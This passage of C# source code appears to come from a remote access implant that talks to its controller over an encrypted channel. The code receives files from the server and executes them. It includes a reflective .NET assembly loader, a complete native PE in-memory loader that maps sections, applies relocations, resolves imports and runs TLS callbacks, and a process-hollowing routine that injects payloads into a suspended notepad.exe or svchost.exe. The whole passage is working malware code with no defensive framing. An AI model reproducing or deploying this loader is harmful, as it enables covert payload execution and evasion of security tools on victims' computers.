                    Log("[Plugin] " + plugId + " exited");
                    activePlugins.Remove(plugId);
                }
            }
        }
    }

    private static bool SendAllPluginOutput(Stream stream)
    {
        bool anySent = false;

        foreach (string plugId in activePlugins.Keys.ToArray())
        {
            PluginEntry pluginEntry = activePlugins[plugId];
            if (pluginEntry == null || pluginEntry.Runner == null) continue;

            int queueCount = pluginEntry.Runner.GetOutQueueCount();
            if (queueCount <= 0) continue;

            if (queueCount > 100)
            {
                Log("[Plugin] " + plugId + " backlog (" + queueCount + "), clearing");
                pluginEntry.Runner.ClearOutQueue();
                continue;
            }

            byte[] idBytes = Encoding.UTF8.GetBytes(plugId);
            int sent = 0;

            while (sent < 50)
            {
                byte[] item;
                if (!pluginEntry.Runner.OutQueue.TryDequeue(out item) || item == null)
                    break;

                byte[] payload = new byte[1 + idBytes.Length + item.Length];
                payload[0] = (byte)idBytes.Length;
                Buffer.BlockCopy(idBytes, 0, payload, 1, idBytes.Length);
                Buffer.BlockCopy(item, 0, payload, 1 + idBytes.Length, item.Length);

                lock (_writeLock)
                {
                    WriteEncryptedMessage(stream, MSG_PLUGIN_DATA, payload, _aesKey);
                }
                sent++;
                anySent = true;
            }
        }

        return anySent;
    }

    // ==================== File Transfer ====================

    private static void HandleFileTransfer(byte[] payload)
    {
        if (payload == null || payload.Length < 3)
        {
            Log("File transfer payload too small (" + (payload != null ? payload.Length : 0) + " bytes)");
            return;
        }

        int offset = 0;

        byte execMode = payload[offset++];
        bool inMemory = (execMode == EXEC_MODE_IN_MEMORY);

        int hashLen = payload[offset++];
        string expectedHash = null;

        if (hashLen > 0 && offset + hashLen <= payload.Length)
        {
            expectedHash = Encoding.UTF8.GetString(payload, offset, hashLen);
            offset += hashLen;
        }

        if (offset >= payload.Length)
        {
            Log("File transfer: no file data after header");
            return;
        }

        int fileLen = payload.Length - offset;
        byte[] fileBytes = new byte[fileLen];
        Buffer.BlockCopy(payload, offset, fileBytes, 0, fileLen);

        string modeStr = inMemory ? "in-memory" : "drop-to-disk";
        Log("File received: " + fileBytes.Length + " bytes (mode: " + modeStr + ")");

        if (!string.IsNullOrEmpty(expectedHash))
        {
            using (var sha = SHA256.Create())
            {
                string actualHash = BitConverter.ToString(
                    sha.ComputeHash(fileBytes)).Replace("-", "").ToLower();
                if (actualHash != expectedHash)
                {
                    Log("HASH MISMATCH! Expected: " + expectedHash.Substring(0, Math.Min(16, expectedHash.Length))
                        + "... Got: " + actualHash.Substring(0, Math.Min(16, actualHash.Length)) + "...");
                    return;
                }
                Log("Hash verified OK");
            }
        }

        if (inMemory)
            ExecuteInMemory(fileBytes);
        else
            ExecuteDropToDisk(fileBytes);
    }

    // ==================== PE Analysis ====================

    private class PeInfo
    {
        public bool IsValid { get; set; }
        public bool IsDotNet { get; set; }
        public bool IsDll { get; set; }
        public bool Is64Bit { get; set; }
        public bool HasRelocations { get; set; }
        public bool RelocsStripped { get; set; }
        public ushort Machine { get; set; }
        public int PeHeaderOffset { get; set; }
        public int NumberOfSections { get; set; }
        public uint SizeOfImage { get; set; }
        public uint SizeOfHeaders { get; set; }
        public long ImageBase { get; set; }
        public uint SectionAlignment { get; set; }
        public uint FileAlignment { get; set; }
        public int OptionalHeaderOffset { get; set; }
        public int DataDirectoryOffset { get; set; }
        public int NumberOfDataDirectories { get; set; }
        public int SectionHeadersOffset { get; set; }
        public uint AddressOfEntryPoint { get; set; }
        public ushort Characteristics { get; set; }
        public ushort SizeOfOptionalHeader { get; set; }
    }

    private static PeInfo AnalyzePE(byte[] fileBytes)
    {
        var info = new PeInfo();

        if (fileBytes == null || fileBytes.Length < 64)
            return info;

        if (fileBytes[0] != 0x4D || fileBytes[1] != 0x5A)
            return info;

        int peOffset = BitConverter.ToInt32(fileBytes, 0x3C);
        if (peOffset <= 0 || peOffset + 24 >= fileBytes.Length)
            return info;

        if (fileBytes[peOffset] != 0x50 || fileBytes[peOffset + 1] != 0x45 ||
            fileBytes[peOffset + 2] != 0x00 || fileBytes[peOffset + 3] != 0x00)
            return info;

        info.IsValid = true;
        info.PeHeaderOffset = peOffset;

        info.Machine = BitConverter.ToUInt16(fileBytes, peOffset + 4);
        info.NumberOfSections = BitConverter.ToUInt16(fileBytes, peOffset + 6);
        info.SizeOfOptionalHeader = BitConverter.ToUInt16(fileBytes, peOffset + 20);
        info.Characteristics = BitConverter.ToUInt16(fileBytes, peOffset + 22);

        info.IsDll = (info.Characteristics & IMAGE_FILE_DLL) != 0;
        info.RelocsStripped = (info.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) != 0;

        if (info.SizeOfOptionalHeader == 0)
            return info;

        info.OptionalHeaderOffset = peOffset + 24;

        ushort magic = BitConverter.ToUInt16(fileBytes, info.OptionalHeaderOffset);
        info.Is64Bit = (magic == 0x20B);

        Log("[PE] Format: " + (info.Is64Bit ? "PE32+ (64-bit)" : "PE32 (32-bit)") +
            ", Machine: 0x" + info.Machine.ToString("X4") +
            (info.IsDll ? ", DLL" : ", EXE"));

        if (info.Is64Bit)
        {
            info.AddressOfEntryPoint = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 16);
            info.ImageBase = BitConverter.ToInt64(fileBytes, info.OptionalHeaderOffset + 24);
            info.SectionAlignment = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 32);
            info.FileAlignment = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 36);
            info.SizeOfImage = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 56);
            info.SizeOfHeaders = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 60);
            info.NumberOfDataDirectories = BitConverter.ToInt32(fileBytes, info.OptionalHeaderOffset + 108);
            info.DataDirectoryOffset = info.OptionalHeaderOffset + 112;
        }
        else
        {
            info.AddressOfEntryPoint = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 16);
            info.ImageBase = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 28);
            info.SectionAlignment = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 32);
            info.FileAlignment = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 36);
            info.SizeOfImage = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 56);
            info.SizeOfHeaders = BitConverter.ToUInt32(fileBytes, info.OptionalHeaderOffset + 60);
            info.NumberOfDataDirectories = BitConverter.ToInt32(fileBytes, info.OptionalHeaderOffset + 92);
            info.DataDirectoryOffset = info.OptionalHeaderOffset + 96;
        }

        info.SectionHeadersOffset = info.OptionalHeaderOffset + info.SizeOfOptionalHeader;

        if (info.NumberOfDataDirectories > IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
        {
            int clrDirOffset = info.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR * 8);
            if (clrDirOffset + 8 <= fileBytes.Length)
            {
                uint clrRva = BitConverter.ToUInt32(fileBytes, clrDirOffset);
                uint clrSize = BitConverter.ToUInt32(fileBytes, clrDirOffset + 4);
                info.IsDotNet = (clrRva != 0 && clrSize != 0);
            }
        }

        if (info.NumberOfDataDirectories > IMAGE_DIRECTORY_ENTRY_BASERELOC)
        {
            int relocDirOffset = info.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
            if (relocDirOffset + 8 <= fileBytes.Length)
            {
                uint relocRva = BitConverter.ToUInt32(fileBytes, relocDirOffset);
                uint relocSize = BitConverter.ToUInt32(fileBytes, relocDirOffset + 4);
                info.HasRelocations = (relocRva != 0 && relocSize != 0);
            }
        }

        Log("[PE] .NET: " + info.IsDotNet + ", HasRelocs: " + info.HasRelocations +
            ", EntryPoint RVA: 0x" + info.AddressOfEntryPoint.ToString("X8") +
            ", ImageBase: 0x" + info.ImageBase.ToString("X") +
            ", SizeOfImage: 0x" + info.SizeOfImage.ToString("X8"));

        return info;
    }

    // ==================== In-Memory Execution Router ====================

    private static void ExecuteInMemory(byte[] fileBytes)
    {
        if (fileBytes == null || fileBytes.Length < 64)
        {
            Log("[IN-MEMORY] File too small");
            ExecuteDropToDisk(fileBytes);
            return;
        }

        PeInfo pe = AnalyzePE(fileBytes);
        if (!pe.IsValid)
        {
            Log("[IN-MEMORY] Not a valid PE file. Falling back to drop-to-disk.");
            ExecuteDropToDisk(fileBytes);
            return;
        }

        bool is64BitProcess = IntPtr.Size == 8;
        bool peIs64 = pe.Is64Bit;
        bool archMatch = (peIs64 == is64BitProcess);

        Log("[IN-MEMORY] Process=" + (is64BitProcess ? "x64" : "x86") +
            ", PE=" + (peIs64 ? "x64" : "x86") + ", Match=" + archMatch);

        if (pe.IsDotNet)
        {
            if (archMatch || pe.Machine == IMAGE_FILE_MACHINE_I386)
            {
                ExecuteDotNetInMemory(fileBytes, pe);
            }
            else
            {
                Log("[IN-MEMORY] Architecture mismatch for .NET assembly. Falling back to drop-to-disk.");
                ExecuteDropToDisk(fileBytes);
            }
            return;
        }

        if (archMatch)
        {
            ExecuteNativeInMemory(fileBytes, pe);
        }
        else
        {
            Log("[IN-MEMORY] Architecture mismatch, using process hollowing...");
            ExecuteViaProcessHollowing(fileBytes, pe);
        }
    }

    // ==================== .NET In-Memory ====================

    private static void ExecuteDotNetInMemory(byte[] fileBytes, PeInfo pe)
    {
        try
        {
            Log("[IN-MEMORY] Loading .NET assembly (" + fileBytes.Length + " bytes)...");

            Assembly asm = Assembly.Load(fileBytes);
            Log("[IN-MEMORY] Assembly loaded: " + asm.FullName);

            Type[] allTypes = null;
            try
            {
                allTypes = asm.GetTypes();
            }
            catch (ReflectionTypeLoadException rtle)
            {
                Log("[IN-MEMORY] ReflectionTypeLoadException");
                if (rtle.LoaderExceptions != null)
                {
                    foreach (Exception le in rtle.LoaderExceptions)
                    {
                        if (le != null)
                            Log("[IN-MEMORY]   Loader error: " + le.Message);
                    }
                }
                allTypes = rtle.Types.Where(t => t != null).ToArray();
            }

            MethodInfo entryPoint = asm.EntryPoint;
            if (entryPoint != null)
            {
                Log("[IN-MEMORY] Entry point: " + entryPoint.DeclaringType.FullName + "." + entryPoint.Name);
                RunEntryPoint(entryPoint);
                return;
            }

            Log("[IN-MEMORY] No entry point. Searching for Main...");
            if (allTypes != null)
            {
                foreach (Type t in allTypes)
                {
                    try
                    {
                        MethodInfo mainMethod = t.GetMethod("Main",
                            BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
                        if (mainMethod != null)
                        {
                            Log("[IN-MEMORY] Found Main in " + t.FullName);
                            RunEntryPoint(mainMethod);
                            return;
                        }
                    }
                    catch { }
                }
            }

            Log("[IN-MEMORY] No Main method found. Falling back to drop-to-disk.");
            ExecuteDropToDisk(fileBytes);
        }
        catch (BadImageFormatException bife)
        {
            Log("[IN-MEMORY] BadImageFormatException: " + bife.Message);
            ExecuteDropToDisk(fileBytes);
        }
        catch (FileLoadException fle)
        {
            Log("[IN-MEMORY] FileLoadException: " + fle.Message);
            ExecuteDropToDisk(fileBytes);
        }
        catch (Exception ex)
        {
            Log("[IN-MEMORY] .NET load failed: " + ex.GetType().Name + ": " + ex.Message);
            ExecuteDropToDisk(fileBytes);
        }
    }

    private static void RunEntryPoint(MethodInfo entryPoint)
    {
        Thread execThread = new Thread(() =>
        {
            try
            {
                ParameterInfo[] paramInfos = entryPoint.GetParameters();
                object result = null;

                if (paramInfos.Length == 0)
                {
                    result = entryPoint.Invoke(null, null);
                }
                else if (paramInfos.Length == 1 && paramInfos[0].ParameterType == typeof(string[]))
                {
                    result = entryPoint.Invoke(null, new object[] { new string[0] });
                }
                else
                {
                    object[] defaultParams = new object[paramInfos.Length];
                    for (int i = 0; i < paramInfos.Length; i++)
                    {
                        if (paramInfos[i].HasDefaultValue)
                            defaultParams[i] = paramInfos[i].DefaultValue;
                        else if (paramInfos[i].ParameterType == typeof(string[]))
                            defaultParams[i] = new string[0];
                        else if (paramInfos[i].ParameterType.IsValueType)
                            defaultParams[i] = Activator.CreateInstance(paramInfos[i].ParameterType);
                        else
                            defaultParams[i] = null;
                    }
                    result = entryPoint.Invoke(null, defaultParams);
                }

                if (result is Task task)
                    task.GetAwaiter().GetResult();

                Log("[IN-MEMORY] .NET execution completed");
            }
            catch (TargetInvocationException tie)
            {
                Exception inner = tie.InnerException ?? tie;
                Log("[IN-MEMORY] .NET execution error: " + inner.GetType().Name + ": " + inner.Message);
            }
            catch (Exception ex)
            {
                Log("[IN-MEMORY] .NET execution error: " + ex.GetType().Name + ": " + ex.Message);
            }
        });

        execThread.IsBackground = true;
        execThread.Name = "InMemoryDotNet";

        try { execThread.SetApartmentState(ApartmentState.STA); }
        catch { }

        execThread.Start();
        Log("[IN-MEMORY] .NET execution thread started");
    }

    // ==================== Native PE In-Memory Loader ====================

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int ExeEntryDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate void TlsCallbackDelegate(IntPtr dllHandle, uint reason, IntPtr reserved);

    private static void ExecuteNativeInMemory(byte[] fileBytes, PeInfo pe)
    {
        IntPtr baseAddress = IntPtr.Zero;

        try
        {
            Log("[NATIVE-MEM] Starting native PE mapping...");

            IntPtr preferredBase = new IntPtr(pe.ImageBase);
            baseAddress = VirtualAlloc(preferredBase, pe.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (baseAddress == IntPtr.Zero)
            {
                baseAddress = VirtualAlloc(IntPtr.Zero, pe.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    Log("[NATIVE-MEM] VirtualAlloc failed! Error: " + Marshal.GetLastWin32Error());
                    ExecuteDropToDisk(fileBytes);
                    return;
                }

                if (pe.RelocsStripped)
                {
                    Log("[NATIVE-MEM] Relocations stripped and base mismatch!");
                    VirtualFree(baseAddress, 0, MEM_RELEASE);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }
            }

            int headerCopySize = (int)Math.Min(pe.SizeOfHeaders, (uint)fileBytes.Length);
            Marshal.Copy(fileBytes, 0, baseAddress, headerCopySize);

            MapSections(baseAddress, fileBytes, pe);

            long delta = baseAddress.ToInt64() - pe.ImageBase;
            if (delta != 0)
            {
                if (pe.HasRelocations)
                {
                    if (!ProcessRelocations(baseAddress, pe, delta))
                    {
                        VirtualFree(baseAddress, 0, MEM_RELEASE);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }
                }
            }

            if (!ResolveImports(baseAddress, pe))
            {
                VirtualFree(baseAddress, 0, MEM_RELEASE);
                ExecuteDropToDisk(fileBytes);
                return;
            }

            ApplySectionProtections(baseAddress, fileBytes, pe);
            FlushInstructionCache(GetCurrentProc(), baseAddress, new UIntPtr(pe.SizeOfImage));
            CallTlsCallbacks(baseAddress, pe);

            if (pe.AddressOfEntryPoint == 0)
            {
                Log("[NATIVE-MEM] No entry point. PE mapped but not executed.");
                return;
            }

            IntPtr entryPointAddr = new IntPtr(baseAddress.ToInt64() + pe.AddressOfEntryPoint);

            if (pe.IsDll)
                CallDllEntryPoint(baseAddress, entryPointAddr);
            else
                CallExeEntryPoint(entryPointAddr);

            Log("[NATIVE-MEM] Native PE execution started.");
        }
        catch (Exception ex)
        {
            Log("[NATIVE-MEM] Fatal error: " + ex.GetType().Name + ": " + ex.Message);

            if (baseAddress != IntPtr.Zero)
            {
                try { VirtualFree(baseAddress, 0, MEM_RELEASE); }
                catch { }
            }

            ExecuteDropToDisk(fileBytes);
        }
    }

    private static void MapSections(IntPtr baseAddress, byte[] fileBytes, PeInfo pe)
    {
        int sectionOffset = pe.SectionHeadersOffset;

        for (int i = 0; i < pe.NumberOfSections; i++)
        {
            if (sectionOffset + 40 > fileBytes.Length) break;

            uint virtualSize = BitConverter.ToUInt32(fileBytes, sectionOffset + 8);
            uint virtualAddress = BitConverter.ToUInt32(fileBytes, sectionOffset + 12);
            uint rawDataSize = BitConverter.ToUInt32(fileBytes, sectionOffset + 16);
            uint rawDataOffset = BitConverter.ToUInt32(fileBytes, sectionOffset + 20);

            IntPtr sectionDest = new IntPtr(baseAddress.ToInt64() + virtualAddress);

            uint copySize = Math.Min(rawDataSize, virtualSize);
            if (rawDataSize == 0 || rawDataOffset == 0)
                copySize = 0;

            if (copySize > 0 && rawDataOffset + copySize > (uint)fileBytes.Length)
                copySize = (uint)Math.Max(0, fileBytes.Length - (int)rawDataOffset);

            if (copySize > 0 && rawDataOffset < (uint)fileBytes.Length)
                Marshal.Copy(fileBytes, (int)rawDataOffset, sectionDest, (int)copySize);

            sectionOffset += 40;
        }
    }

    private static void ApplySectionProtections(IntPtr baseAddress, byte[] fileBytes, PeInfo pe)
    {
        int sectionOffset = pe.SectionHeadersOffset;

        for (int i = 0; i < pe.NumberOfSections; i++)
        {
            if (sectionOffset + 40 > fileBytes.Length) break;

            uint virtualSize = BitConverter.ToUInt32(fileBytes, sectionOffset + 8);
            uint virtualAddress = BitConverter.ToUInt32(fileBytes, sectionOffset + 12);
            uint characteristics = BitConverter.ToUInt32(fileBytes, sectionOffset + 36);

            if (virtualSize == 0)
            {
                sectionOffset += 40;
                continue;
            }

            IntPtr sectionAddr = new IntPtr(baseAddress.ToInt64() + virtualAddress);
            uint alignedSize = AlignUp(virtualSize, 4096);

            if ((characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0)
            {
                uint oldProt;
                VirtualProtect(sectionAddr, alignedSize, PAGE_NOACCESS, out oldProt);
                sectionOffset += 40;
                continue;
            }

            uint protect = GetSectionProtection(characteristics);
            uint oldProtect;
            VirtualProtect(sectionAddr, alignedSize, protect, out oldProtect);

            sectionOffset += 40;
        }

        uint headerOldProt;
        VirtualProtect(baseAddress, AlignUp(pe.SizeOfHeaders, 4096), PAGE_READONLY, out headerOldProt);
    }

    private static bool ProcessRelocations(IntPtr baseAddress, PeInfo pe, long delta)
    {
        if (pe.NumberOfDataDirectories <= IMAGE_DIRECTORY_ENTRY_BASERELOC)
            return true;

        int relocDirFileOffset = pe.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
        IntPtr relocDirAddr = new IntPtr(baseAddress.ToInt64() + relocDirFileOffset);

        uint relocRva = (uint)Marshal.ReadInt32(relocDirAddr);
        uint relocSize = (uint)Marshal.ReadInt32(new IntPtr(relocDirAddr.ToInt64() + 4));

        if (relocRva == 0 || relocSize == 0)
            return true;

        IntPtr relocBase = new IntPtr(baseAddress.ToInt64() + relocRva);
        int processed = 0;
        uint offset = 0;

        while (offset < relocSize)
        {
            IntPtr blockPtr = new IntPtr(relocBase.ToInt64() + offset);
            uint pageRva = (uint)Marshal.ReadInt32(blockPtr);
            uint blockSize = (uint)Marshal.ReadInt32(new IntPtr(blockPtr.ToInt64() + 4));

            if (blockSize == 0 || blockSize < 8) break;
            if (offset + blockSize > relocSize) break;

            int numEntries = (int)(blockSize - 8) / 2;

            for (int i = 0; i < numEntries; i++)
            {
                IntPtr entryPtr = new IntPtr(blockPtr.ToInt64() + 8 + (i * 2));
                ushort entry = (ushort)Marshal.ReadInt16(entryPtr);
                int type = entry >> 12;
                int entryOffset = entry & 0xFFF;

                if (type == IMAGE_REL_BASED_ABSOLUTE)
                    continue;

                IntPtr patchAddr = new IntPtr(baseAddress.ToInt64() + pageRva + entryOffset);

                switch (type)
                {
                    case IMAGE_REL_BASED_HIGHLOW:
                        {
                            int original = Marshal.ReadInt32(patchAddr);
                            Marshal.WriteInt32(patchAddr, (int)((long)original + delta));
                            processed++;
                        }
                        break;

                    case IMAGE_REL_BASED_DIR64:
                        {
                            long original = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, original + delta);
                            processed++;
                        }
                        break;
                }
            }

            offset += blockSize;
        }

        Log("[NATIVE-MEM] Processed " + processed + " relocations.");
        return true;
    }

    private static bool ResolveImports(IntPtr baseAddress, PeInfo pe)
    {
        if (pe.NumberOfDataDirectories <= IMAGE_DIRECTORY_ENTRY_IMPORT)
            return true;

        int importDirFileOffset = pe.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
        IntPtr importDirAddr = new IntPtr(baseAddress.ToInt64() + importDirFileOffset);

        uint importRva = (uint)Marshal.ReadInt32(importDirAddr);
        uint importSize = (uint)Marshal.ReadInt32(new IntPtr(importDirAddr.ToInt64() + 4));

        if (importRva == 0 || importSize == 0)
            return true;

        IntPtr importDescAddr = new IntPtr(baseAddress.ToInt64() + importRva);
        int descriptorIndex = 0;
        int totalImports = 0;
        int failedImports = 0;
        bool is64 = pe.Is64Bit;
        int ptrSize = is64 ? 8 : 4;

        while (true)
        {
            IntPtr descPtr = new IntPtr(importDescAddr.ToInt64() + (descriptorIndex * 20));

            uint originalFirstThunk = (uint)Marshal.ReadInt32(new IntPtr(descPtr.ToInt64() + 0));
            uint nameRva = (uint)Marshal.ReadInt32(new IntPtr(descPtr.ToInt64() + 12));
            uint firstThunk = (uint)Marshal.ReadInt32(new IntPtr(descPtr.ToInt64() + 16));

            if (nameRva == 0 && firstThunk == 0) break;

            IntPtr namePtr = new IntPtr(baseAddress.ToInt64() + nameRva);
            string dllName = Marshal.PtrToStringAnsi(namePtr);

            if (string.IsNullOrEmpty(dllName)) break;

            IntPtr hModule = GetModuleHandleA(dllName);
            if (hModule == IntPtr.Zero)
            {
                hModule = LoadLibraryA(dllName);
                if (hModule == IntPtr.Zero)
                {
                    Log("[NATIVE-MEM] FAILED to load: " + dllName);
                    failedImports++;
                    descriptorIndex++;
                    continue;
                }
            }

            uint lookupRva = originalFirstThunk != 0 ? originalFirstThunk : firstThunk;
            IntPtr lookupPtr = new IntPtr(baseAddress.ToInt64() + lookupRva);
            IntPtr iatPtr = new IntPtr(baseAddress.ToInt64() + firstThunk);

            int funcIndex = 0;

            while (true)
            {
                IntPtr thunkAddr = new IntPtr(lookupPtr.ToInt64() + (funcIndex * ptrSize));
                IntPtr iatEntry = new IntPtr(iatPtr.ToInt64() + (funcIndex * ptrSize));

                long thunkValue;
                if (is64)
                    thunkValue = Marshal.ReadInt64(thunkAddr);
                else
                    thunkValue = (long)(uint)Marshal.ReadInt32(thunkAddr);

                if (thunkValue == 0) break;

                IntPtr funcAddr = IntPtr.Zero;

                bool isByOrdinal;
                if (is64)
                    isByOrdinal = (thunkValue & unchecked((long)0x8000000000000000)) != 0;
                else
                    isByOrdinal = (thunkValue & 0x80000000) != 0;

                if (isByOrdinal)
                {
                    int ordinal = (int)(thunkValue & 0xFFFF);
                    funcAddr = GetProcAddress(hModule, ordinal);
                    if (funcAddr == IntPtr.Zero) failedImports++;
                }
                else
                {
                    long nameRvaValue = thunkValue & 0x7FFFFFFF;
                    IntPtr nameEntryPtr = new IntPtr(baseAddress.ToInt64() + nameRvaValue);
                    IntPtr funcNamePtr = new IntPtr(nameEntryPtr.ToInt64() + 2);
                    string funcName = Marshal.PtrToStringAnsi(funcNamePtr);

                    if (!string.IsNullOrEmpty(funcName))
                    {
                        funcAddr = GetProcAddress(hModule, funcName);
                        if (funcAddr == IntPtr.Zero) failedImports++;
                    }
                }

                if (funcAddr != IntPtr.Zero)
                {
                    if (is64)
                        Marshal.WriteInt64(iatEntry, funcAddr.ToInt64());
                    else
                        Marshal.WriteInt32(iatEntry, funcAddr.ToInt32());
                    totalImports++;
                }

                funcIndex++;
            }

            descriptorIndex++;
        }

        Log("[NATIVE-MEM] Resolved " + totalImports + " imports, " + failedImports + " failed.");
        return failedImports == 0 || totalImports > 0;
    }

    private static void CallTlsCallbacks(IntPtr baseAddress, PeInfo pe)
    {
        if (pe.NumberOfDataDirectories <= IMAGE_DIRECTORY_ENTRY_TLS)
            return;

        int tlsDirFileOffset = pe.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_TLS * 8);
        IntPtr tlsDirAddr = new IntPtr(baseAddress.ToInt64() + tlsDirFileOffset);

        uint tlsRva = (uint)Marshal.ReadInt32(tlsDirAddr);
        uint tlsSize = (uint)Marshal.ReadInt32(new IntPtr(tlsDirAddr.ToInt64() + 4));

        if (tlsRva == 0 || tlsSize == 0) return;

        try
        {
            IntPtr tlsDir = new IntPtr(baseAddress.ToInt64() + tlsRva);
            int ptrSize = pe.Is64Bit ? 8 : 4;

            IntPtr callbacksArrayVA;
            if (pe.Is64Bit)
                callbacksArrayVA = new IntPtr(Marshal.ReadInt64(new IntPtr(tlsDir.ToInt64() + 24)));
            else
                callbacksArrayVA = new IntPtr(Marshal.ReadInt32(new IntPtr(tlsDir.ToInt64() + 12)));

            if (callbacksArrayVA == IntPtr.Zero) return;

            int cbIndex = 0;

            while (cbIndex < 64)
            {
                IntPtr cbSlot = new IntPtr(callbacksArrayVA.ToInt64() + (cbIndex * ptrSize));
                IntPtr cbAddr;

                if (pe.Is64Bit)
                    cbAddr = new IntPtr(Marshal.ReadInt64(cbSlot));
                else
                    cbAddr = new IntPtr(Marshal.ReadInt32(cbSlot));

                if (cbAddr == IntPtr.Zero) break;

                try
                {
                    var tlsCallback = (TlsCallbackDelegate)Marshal.GetDelegateForFunctionPointer(
                        cbAddr, typeof(TlsCallbackDelegate));
                    tlsCallback(baseAddress, 1, IntPtr.Zero);
                }
                catch (Exception ex)
                {
                    Log("[NATIVE-MEM] TLS callback #" + cbIndex + " exception: " + ex.Message);
                }

                cbIndex++;
            }
        }
        catch (Exception ex)
        {
            Log("[NATIVE-MEM] TLS processing error: " + ex.Message);
        }
    }

    private static void CallDllEntryPoint(IntPtr baseAddress, IntPtr entryPointAddr)
    {
        Thread dllThread = new Thread(() =>
        {
            try
            {
                var dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(
                    entryPointAddr, typeof(DllMainDelegate));
                bool result = dllMain(baseAddress, 1, IntPtr.Zero);
                Log("[NATIVE-MEM] DllMain returned: " + result);
            }
            catch (Exception ex)
            {
                Log("[NATIVE-MEM] DllMain exception: " + ex.Message);
            }
        });
        dllThread.IsBackground = true;
        dllThread.Name = "NativeDllMain";
        dllThread.Start();
    }

    private static void CallExeEntryPoint(IntPtr entryPointAddr)
    {
        Thread exeThread = new Thread(() =>
        {
            try
            {
                uint threadId;
                IntPtr hThread = CreateThread(
                    IntPtr.Zero, 0, entryPointAddr,
                    IntPtr.Zero, 0, out threadId);

                if (hThread == IntPtr.Zero)
                {
                    var exeEntry = (ExeEntryDelegate)Marshal.GetDelegateForFunctionPointer(
                        entryPointAddr, typeof(ExeEntryDelegate));
                    exeEntry();
                    return;
                }

                WaitForSingleObject(hThread, INFINITE);

                uint exitCode;
                GetExitCodeThread(hThread, out exitCode);
                CloseHandle(hThread);

                Log("[NATIVE-MEM] EXE thread completed. Exit code: " + exitCode);
            }
            catch (Exception ex)
            {
                Log("[NATIVE-MEM] EXE execution exception: " + ex.Message);
            }
        });
        exeThread.IsBackground = true;
        exeThread.Name = "NativeExeEntry";
        exeThread.Start();
    }

    // ==================== Process Hollowing ====================

    private static void ExecuteViaProcessHollowing(byte[] fileBytes, PeInfo pe)
    {
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        int targetPid = 0;

        try
        {
            bool peIs32 = !pe.Is64Bit;
            bool processIs64 = IntPtr.Size == 8;

            string hostPath;
            if (peIs32 && processIs64)
            {
                hostPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "SysWOW64", "notepad.exe");
                if (!File.Exists(hostPath))
                    hostPath = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                        "SysWOW64", "svchost.exe");
            }
            else
            {
                hostPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "System32", "notepad.exe");
            }

            if (!File.Exists(hostPath))
            {
                Log("[HOLLOW] Host process not found: " + hostPath);
                ExecuteDropToDisk(fileBytes);
                return;
            }

            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;

            bool created = CreateProcessW(
                hostPath, null,
                IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED,
                IntPtr.Zero, null,
                ref si, out pi);

            if (!created)
            {
                Log("[HOLLOW] CreateProcess failed! Error: " + Marshal.GetLastWin32Error());
                ExecuteDropToDisk(fileBytes);
                return;
            }

            hProcess = pi.hProcess;
            hThread = pi.hThread;
            targetPid = pi.dwProcessId;

            bool targetIsWow64 = peIs32 && processIs64;

            IntPtr originalImageBase;

            if (targetIsWow64)
            {
                IntPtr peb32Address = IntPtr.Zero;
                int retLen;

                int ntStatus = NtQueryInformationProcess_IntPtr(
                    hProcess, 26, ref peb32Address, IntPtr.Size, out retLen);

                if (ntStatus != 0 || peb32Address == IntPtr.Zero)
                {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }

                IntPtr peb32IbAddr = new IntPtr(peb32Address.ToInt64() + 0x08);
                byte[] ibBytes = new byte[4];
                int br;

                if (!ReadProcessMemory(hProcess, peb32IbAddr, ibBytes, 4, out br) || br != 4)
                {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }

                uint ib32 = BitConverter.ToUInt32(ibBytes, 0);
                originalImageBase = new IntPtr((long)ib32);
            }
            else
            {
                var pbi = new PROCESS_BASIC_INFORMATION();
                int retLen;
                int ntStatus = NtQueryInformationProcess(hProcess, 0, ref pbi,
